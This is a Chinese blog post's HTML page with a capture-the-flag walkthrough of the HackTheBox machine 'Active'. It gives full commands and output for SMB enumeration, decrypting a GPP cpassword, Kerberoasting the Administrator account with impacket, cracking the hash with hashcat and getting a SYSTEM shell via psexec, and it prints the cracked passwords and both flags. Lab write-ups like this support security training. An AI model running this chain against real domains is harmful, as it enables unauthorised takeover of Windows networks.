@@ -1,0 +1,658 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+    
+    
+    
+    
+    <title>Active - Hackthebox | Lucifiel&#39;s Blog | Lucifiel 技术博客</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="Hackthebox">
+    <meta name="description" content="Hackthebox - Active靶场信息  靶场类型  信息收集Nmap┌──(root💀kali)-[~&#x2F;Desktop] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.100 Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2022-04-22 02:56 EDT Nmap scan re">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Active - Hackthebox">
+<meta property="og:url" content="http://www.lucifiel.com/2022/04/24/Hackthebox/Hackthebox-Active/index.html">
+<meta property="og:site_name" content="Lucifiel&#39;s Blog">
+<meta property="og:description" content="Hackthebox - Active靶场信息  靶场类型  信息收集Nmap┌──(root💀kali)-[~&#x2F;Desktop] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.100 Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2022-04-22 02:56 EDT Nmap scan re">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://www.lucifiel.com/2022/04/24/Hackthebox/Hackthebox-Active/a289e434-5250-48bb-bf76-746fc219f445.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/04/24/Hackthebox/Hackthebox-Active/69c80c61-a7ea-4908-907b-9e855792b26f.png">
+<meta property="article:published_time" content="2022-04-24T11:38:36.000Z">
+<meta property="article:modified_time" content="2023-06-13T03:39:25.596Z">
+<meta property="article:author" content="Lucifiel">
+<meta property="article:tag" content="Hackthebox">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://www.lucifiel.com/2022/04/24/Hackthebox/Hackthebox-Active/a289e434-5250-48bb-bf76-746fc219f445.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+
+<body>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Lucifiel</h5>
+          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/LucifielHack" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                About
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">Active - Hackthebox</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">Active - Hackthebox</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2022-04-24T11:38:36.000Z" itemprop="datePublished" class="page-time">
+  2022-04-24
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Hackthebox-Active"><span class="post-toc-text">Hackthebox - Active</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#靶场信息"><span class="post-toc-text">靶场信息</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#靶场类型"><span class="post-toc-text">靶场类型</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#信息收集"><span class="post-toc-text">信息收集</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Nmap"><span class="post-toc-text">Nmap</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Smb"><span class="post-toc-text">Smb</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#漏洞利用"><span class="post-toc-text">漏洞利用</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#权限提升"><span class="post-toc-text">权限提升</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-Hackthebox/Hackthebox-Active"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">Active - Hackthebox</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2022-04-24 19:38:36" datetime="2022-04-24T11:38:36.000Z"  itemprop="datePublished">2022-04-24</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="Hackthebox-Active"><a href="#Hackthebox-Active" class="headerlink" title="Hackthebox - Active"></a>Hackthebox - Active</h1><h1 id="靶场信息"><a href="#靶场信息" class="headerlink" title="靶场信息"></a>靶场信息</h1><img src="/2022/04/24/Hackthebox/Hackthebox-Active/a289e434-5250-48bb-bf76-746fc219f445.png" class>
+
+<h1 id="靶场类型"><a href="#靶场类型" class="headerlink" title="靶场类型"></a>靶场类型</h1><img src="/2022/04/24/Hackthebox/Hackthebox-Active/69c80c61-a7ea-4908-907b-9e855792b26f.png" class>
+
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.100
+Starting Nmap 7.91 ( https://nmap.org ) at 2022-04-22 02:56 EDT
+Nmap scan report for 10.10.10.100
+Host is up (0.32s latency).
+Not shown: 65513 closed ports
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
+| dns-nsid: 
+|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-04-22 06:57:01Z)
+135/tcp   open  msrpc?
+139/tcp   open  netbios-ssn?
+389/tcp   open  tcpwrapped
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5722/tcp  open  msdfsr?
+9389/tcp  open  mc-nmf        .NET Message Framing
+49152/tcp open  unknown
+49153/tcp open  msrpc         Microsoft Windows RPC
+49154/tcp open  unknown
+49155/tcp open  tcpwrapped
+49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49158/tcp open  tcpwrapped
+49165/tcp open  msrpc         Microsoft Windows RPC
+49170/tcp open  unknown
+49171/tcp open  unknown
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port139-TCP:V=7.91%I=7%D=4/22%Time=626251C0%P=x86_64-pc-linux-gnu%r(Get
+SF:Request,5,&quot;\x83\0\0\x01\x8f&quot;);
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.91%E=4%D=4/22%OT=53%CT=1%CU=38032%PV=Y%DS=2%DC=T%G=Y%TM=6262527
+OS:A%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10A%TI=I%CI=I%TS=7)SEQ(SP=1
+OS:05%GCD=1%ISR=10D%TI=I%CI=RD%II=I%SS=O%TS=7)SEQ(SP=105%GCD=1%ISR=10E%TI=R
+OS:D%CI=I%II=I%TS=A)OPS(O1=M505NW8ST11%O2=M505NW8ST11%O3=M505NW8NNT11%O4=M5
+OS:05NW8ST11%O5=M505NW8ST11%O6=M505ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000
+OS:%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M505NW8NNS%CC=N%Q=)T1(R=Y%DF
+OS:=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%
+OS:Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A
+OS:%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y
+OS:%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR
+OS:%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RU
+OS:D=G)IE(R=Y%DFI=N%T=80%CD=Z)
+
+Network Distance: 2 hops
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows                                                                                                     
+
+Host script results:
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2022-04-22T06:58:32
+|_  start_date: 2022-04-22T06:55:19
+
+TRACEROUTE (using port 1025/tcp)
+HOP RTT       ADDRESS
+1   316.49 ms 10.10.14.1
+2   316.60 ms 10.10.10.100
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 216.91 seconds
+</code></pre>
+<h2 id="Smb"><a href="#Smb" class="headerlink" title="Smb"></a>Smb</h2><p>这里看到有 smb，去查看一下</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# smbmap -H 10.10.10.100                  
+[+] IP: 10.10.10.100:445        Name: 10.10.10.100                                  
+        Disk                                           Permissions     Comment
+        ----                                           -----------     -------
+        ADMIN$                                         NO ACCESS       Remote Admin
+        C$                                             NO ACCESS       Default shar
+        IPC$                                           NO ACCESS       Remote IPC
+        NETLOGON                                       NO ACCESS       Logon server
+        Replication                                    READ ONLY
+        SYSVOL                                         NO ACCESS       Logon server
+        Users                                          NO ACCESS
+</code></pre>
+<p>这里有一个 Replication 目录是可以查看的，去看一下</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# smbclient //10.10.10.100/Replication    
+Enter WORKGROUP\root&#39;s password: 
+Anonymous login successful
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; dir
+  .                                   D        0  Sat Jul 21 06:37:44 2018
+  ..                                  D        0  Sat Jul 21 06:37:44 2018
+  active.htb                          D        0  Sat Jul 21 06:37:44 2018
+
+                5217023 blocks of size 4096. 249292 blocks available
+</code></pre>
+<p>有个 active.htb 文件夹，给下载下来</p>
+<pre><code class="bash">recurse ON
+prompt OFF
+mget *
+</code></pre>
+<pre><code class="bash">active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
+</code></pre>
+<p>在上面这个文件中找到了一个账号和密码</p>
+<pre><code class="bash">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;Groups clsid=&quot;{3125E937-EB16-4b4c-9934-544FC6D24D26}&quot;&gt;&lt;User clsid=&quot;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&quot; name=&quot;active.htb\SVC_TGS&quot; image=&quot;2&quot; changed=&quot;2018-07-18 20:46:06&quot; uid=&quot;{EF57DA28-5F69-4530-A59E-AAB58578219D}&quot;&gt;&lt;Properties action=&quot;U&quot; newName=&quot;&quot; fullName=&quot;&quot; description=&quot;&quot; cpassword=&quot;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&quot; changeLogon=&quot;0&quot; noChange=&quot;1&quot; neverExpires=&quot;1&quot; acctDisabled=&quot;0&quot; userName=&quot;active.htb\SVC_TGS&quot;/&gt;&lt;/User&gt;
+&lt;/Groups&gt;
+</code></pre>
+<pre><code class="bash">username = active.htb\SVC_TGS
+cpassword = edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVm
+</code></pre>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>使用 kali 自带的 gpp-decrypt 进行解密</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
+GPPstillStandingStrong2k18
+</code></pre>
+<pre><code class="bash">username = SVC_TGS
+password = GPPstillStandingStrong2k18
+</code></pre>
+<p>现在我们有了账号密码，继续去 smb 里查看文件</p>
+<pre><code class="bash">smbclient //10.10.10.100/Users -U SVC_TGS%GPPstillStandingStrong2k18
+</code></pre>
+<pre><code class="bash">smb: \&gt; dir
+  .                                  DR        0  Sat Jul 21 10:39:20 2018
+  ..                                 DR        0  Sat Jul 21 10:39:20 2018
+  Administrator                       D        0  Mon Jul 16 06:14:21 2018
+  All Users                       DHSrn        0  Tue Jul 14 01:06:44 2009
+  Default                           DHR        0  Tue Jul 14 02:38:21 2009
+  Default User                    DHSrn        0  Tue Jul 14 01:06:44 2009
+  desktop.ini                       AHS      174  Tue Jul 14 00:57:55 2009
+  Public                             DR        0  Tue Jul 14 00:57:55 2009
+  SVC_TGS                             D        0  Sat Jul 21 11:16:32 2018
+
+                5217023 blocks of size 4096. 279115 blocks available
+</code></pre>
+<p>似乎直接就进系统了，去找找看有没有有价值的文件</p>
+<pre><code class="bash">cd SVC_TGS\Desktop\
+get user.txt
+</code></pre>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# cat user.txt   
+a8644850ef3290ae34457a8ad9982d5e
+</code></pre>
+<p>成功拿到 user 权限的 flag 文件</p>
+<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><p>这台机器的 88 端口运行着 k8s(kerberos)，咱们可以用 impacket 来进行利用</p>
+<blockquote>
+<p><a href="https://github.com/SecureAuthCorp/impacket" target="_blank" rel="noopener">https://github.com/SecureAuthCorp/impacket</a></p>
+</blockquote>
+<p>接着把这台靶机加入到 hosts里</p>
+<pre><code class="bash">echo 10.10.10.100 active.htb &gt;&gt; /etc/hosts
+</code></pre>
+<p>然后使用这个工具</p>
+<pre><code class="bash">python3 GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18
+</code></pre>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop/impacket/examples]
+└─# python3 GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18
+Impacket v0.9.25.dev1+20220420.234604.17ae0913 - Copyright 2021 SecureAuth Corporation
+
+ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
+--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
+active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2022-04-22 02:56:29.468554             
+
+[-] CCache file is not found. Skipping...
+$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$65399e5d81a676e87013d1d2c95a9919$831e286d069ed4766f092217ea7ed3e87d62dd0d864b137ef449c0fe02bd6d418c6ea56c01254956638d0b0e6f9868bab37574dc0bdc29f47106d8d4f96d9f87ceb62920f566339adfc5ec5d2761a97a7843be5b750a38b8f0aa42f67b3c1dd909fa1832796d43b2be9830c78450c46802a3c266a0000d0c898b003edbe894fc11e4746382b5a422e04fa23096c50d3330fa9bcae382771bcc528c090c245327d968f1bb06f345dc2d44cf92624eea731e7467f5a6dfb6c90d016bc716de3ba2128a428e7d0b4529dcad6a4d59b1780f7ef863580a1e56348eb12cb865e21c5ce047d289762b0c2ae694db3ffed75416c9cda974a3e4ca591cf25288a0278d4ff4e971013e74c5dcb2321e6b228de3617ed8f53705443dfa858d732f39df31d153ea5dfed178961933883613c692856a381c68f00a7821f77682b9d303a0c7e9af9f24cb6de1ccb5a1d74b7de0d3952669f4ea1d730a5cfabe52a970a6d38013934bea4cc175c2cdcb0da52087fb5599a769e8f50c90535c46e28a081791eb56377d67eb9b8334e89c15c25268ad9af9cea1b4d44cbd3eb5c5d431bab1aabe922fa75af954ec75b024351dd1d22a2df3d2d9f968d191fd456062f22e11c6af3d64ca9ee0bae77f933e5e1879f9f45b50e88a6de5278fffcdc20a99fde8e6e305b3bb213584d5c047df73f432386500dde52cfc1fc277399979a8b5955008aad50cbcfa359ddd6d634b99064663a49a2f477b4d2d8d21ffd8fdf9ccc43b10db9b58964e198444881f96ce700c9dc6cb6c4192274cd7e52c7340f2c052909a9bc78e6dee1b7758f07ac32154d3f4fd01fa776520c514de5e6c3ba53ea0b2c81d9e8c1d0124b3467610038423bd14dbdbc863ddc9d0dfd8d768a3682ee7da66d38c3e7d31937c1eb5813d4997377649be0b14487de5cf23be190c7f20cec1f47afa101829fbf3e12320481ca79f6254e2462dadae248020ed5b0bfff84367f33f101f734ff5727eaa101a4faaeadf267d20b3211583d7794c0892a62b6dc25caafc96c17f21ef1585aa6b95b89aa831a22959e145b490364aa28c42ea79763a1db3ef5159558e6898faaf40e5757e3d7889308ec79ae1d2d721ea98b2e79914d85380c4385d62ee308caa77982c84eaaccc84b19cc69d16b4ae471b270b66c02b16f450c109e58cd5e524d20b092c62ce573115d204825121da3913418a596157b6274c3ac653d352f10983b08046de6e3ab6715169dbf250bf0212
+</code></pre>
+<p>把这段 hash 保存下来，然后使用 hashcat 进行爆破</p>
+<pre><code class="bash">hashcat hash /usr/share/wordlists/rockyou.txt -m 13100
+
+Ticketmaster1968
+</code></pre>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop/impacket/examples]
+└─# python3 psexec.py Administrator:Ticketmaster1968@10.10.10.100                                                                                                                                               1 ⚙
+Impacket v0.9.25.dev1+20220420.234604.17ae0913 - Copyright 2021 SecureAuth Corporation
+
+[*] Requesting shares on 10.10.10.100.....
+[*] Found writable share ADMIN$
+[*] Uploading file CahMAAGa.exe
+[*] Opening SVCManager on 10.10.10.100.....
+[*] Creating service jzgq on 10.10.10.100.....
+[*] Starting service jzgq.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32&gt; whoami
+nt authority\system
+</code></pre>
+<p>成功拿到 root 权限的 shell</p>
+<pre><code class="bash">c:\Users\Administrator\Desktop&gt; type root.txt
+d7a6880e1ed8648dcb9012f911819322
+</code></pre>
+<p>成功拿到 root 权限的 flag 文件</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <footer>
+        <a href="http://www.lucifiel.com">
+            <img src="/img/avatar.jpg" alt="Lucifiel">
+            Lucifiel
+        </a>
+    </footer>
+</blockquote>
+
+        
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/04/24/Hackthebox/Hackthebox-Active/&title=《Active - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/04/24/Hackthebox/Hackthebox-Active/&title=《Active - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/04/24/Hackthebox/Hackthebox-Active/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Active - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2022/04/24/Hackthebox/Hackthebox-Active/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/04/24/Hackthebox/Hackthebox-Active/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2022/04/24/Hackthebox/Hackthebox-Access/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">Access - Hackthebox</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2022/04/23/Hackthebox/Hackthebox-Jerry/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">Jerry - Hackthebox</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+        var id = location.pathname
+        if (location.pathname.length > 50) {
+          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
+        }
+        const gitalk = new Gitalk({
+          clientID: 'cf0a9809323df14a9168',
+          clientSecret: 'a30d7a21bf6d88b7ad5c1f5d1bfc45881c49b2ed',
+          repo: 'LucifielHack.github.io',
+          owner: 'LucifielHack',
+          admin: ['LucifielHack'],
+          id: id,      // Ensure uniqueness and length less than 50
+          title: document.title.split('|')[0],
+          distractionFreeMode: false  // Facebook-like distraction free mode
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
+
+
+
+
+</article>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            <!--- 
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>footer.license</span> --->
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>Lucifiel &copy; 2020 - 2023</span>
+            <span>
+                
+                Power by Lucifiel</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/04/24/Hackthebox/Hackthebox-Active/&title=《Active - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/04/24/Hackthebox/Hackthebox-Active/&title=《Active - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/04/24/Hackthebox/Hackthebox-Active/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Active - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2022/04/24/Hackthebox/Hackthebox-Active/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/04/24/Hackthebox/Hackthebox-Active/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
